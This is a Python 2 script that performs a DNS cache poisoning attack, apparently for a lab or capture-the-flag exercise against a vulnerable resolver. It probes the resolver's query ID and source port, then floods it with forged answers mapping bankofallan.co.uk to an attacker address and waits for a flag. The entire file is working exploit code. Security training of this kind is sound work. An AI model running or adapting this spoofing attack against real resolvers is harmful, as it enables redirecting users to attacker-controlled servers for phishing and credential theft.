import dnslib
import socket
import os
import thread
import base64

# parameters to change if needed
dnsIP = "192.168.80.129"
badguyIP = "192.168.80.128"
bankofallanNS = "10.0.0.1"
badguyDNSport = 55553
DNSport = 53
flagport = 1337
flag = None

def fakeReplys(qid):
	"""
	This method craft a fake DNS response packet where associate the bankofallan.co.uk to the badguy ip.
	
	qid: Is the queryID to assign to the crafted packet.
	"""	
	# craft fake DNS query response
	fakeReplyPacket = dnslib.DNSRecord(dnslib.DNSHeader(id = qid, qr = 1, aa = 1, ra = 1), q = dnslib.DNSQuestion("www1337.bankofallan.co.uk"), a = dnslib.RR("bankofallan.co.uk", dnslib.QTYPE.A, rdata = dnslib.A(badguyIP), ttl = 10000)).pack()
	return fakeReplyPacket

def listenerthread():
	"""
	This thread stay in listening mode in order to capture the flag, 
	after that, the flag is assigned to a global variable.

	Listening on port: 1337.
	"""
	# global variable used by the "exploit" method to check if the thread has captured the flag.
	global flag
	# socket to listen
	flagsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	flagsock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	flagsock.bind(("",flagport))
	# The flag is captured (readed) by the socket
	flag = flagsock.recvfrom(512)

def getqueryidnport():
	"""
	This method get the query id and the source port. 
	The socket is listening on port 55553 (badguyDNSport), and wait for the response, while a request is sent to "badguy.ru".
	After capturing The packet, the socket will extract the source port and the query id. 
	To obtain successive queryid we need to craft fake DNS query response packets trying to guess the next id.
	
	sourceport: Used in order to deliver the fake DNS query response to the right port.
	dnsock: Socket used to catch the request
	"""
	# socket listening on port 5553 used to catch a DNS request to get th
	dnsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	dnsock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	dnsock.bind(("",badguyDNSport))
	# request to solve "badguy.ru" to the DNS, not need to print so the output is redirected,
	# the socket will cath it anyway.
	os.system("dig badguy.ru @"+dnsIP+" > /dev/null")
	# read response.
	response = dnsock.recvfrom(512)
	# get source port.
	sourceport = response[1][1]
	# get query id.
	queryid = int(str(dnslib.DNSRecord.parse(response[0])).split("\n")[0].split(" ")[7])
	return (queryid,sourceport)

def exploit():
	"""
	This method actually perform the DNS cache poisoning.
	Declares the socket to send the fake DNS reply packets then starts the thread in listening mode in order to capture the flag,
	once the query id and the source port extracted, the fakes DNS replies are crafted with each one a query id increased by 1, in total 1000 packets are crafted.
	The fakes replies are sent right after the query to "www1337.bankofallan.co.uk" is sent...
	if the response of bankofallan is the badguy ip the flag is sent and the thread will capture and assign to the global variable and the script terminates.
	
	sendreplaysock: socket used to send the pre-crafted fake dns replies.
	queryid: query id of the request from where start to craft the fake replies.
	sourceport: Used in order to deliver the fake DNS query response to the right port.
	fakereplieslist: List containing all the 1000 fake replies with incremental queryid.
	flag: contains the flag received from the vulnDNS.
	"""
	#socket used to send fake replies to 10.0.0.1 on port 53
	sendreplysock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sendreplysock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	sendreplysock.bind((bankofallanNS,DNSport))
	# start thread to catch the flag.
	thread.start_new_thread(listenerthread, ())
	# infinite ( persistent )ries.
	while True:
		print "."
		# get query id and source port.
		queryid, sourceport = getqueryidnport()
		# generate fake reply packets in advance to be faster to send, query id cant be greater than 65535.
		fakereplieslst = [ fakeReplys(qid) for qid in range(queryid,queryid+1000 % 655535) if qid <= 65535]
		# simulate the user, the response is not necessary so it is redirected.
		os.system("dig www1337.bankofallan.co.uk @"+dnsIP+" > /dev/null")
		# send fake replies
		for reply in fakereplieslst: 
			# send fake replies to the destinate ip address and source port.
			sendreplysock.sendto(reply,(dnsIP,sourceport))
		# check if the listener catched the flag
		if flag:
			# if the flag is captured return the flag (terminate the programm)
			return (flag[0], base64.b64decode(flag[0].replace('\n','')))
				
if __name__ == '__main__':
	"""
	Add the 10.0.0.1 (bank of allan authoritative name server) to the loopback so a socket can be bind on that ip and launch the attack.
	"""
	os.system("ip addr add "+bankofallanNS+" dev lo")
	flag = exploit()
	print "======== Flag ========"
	print flag[0]
	print "\n=== decoded base64 ==="
	print flag[1]
	
	
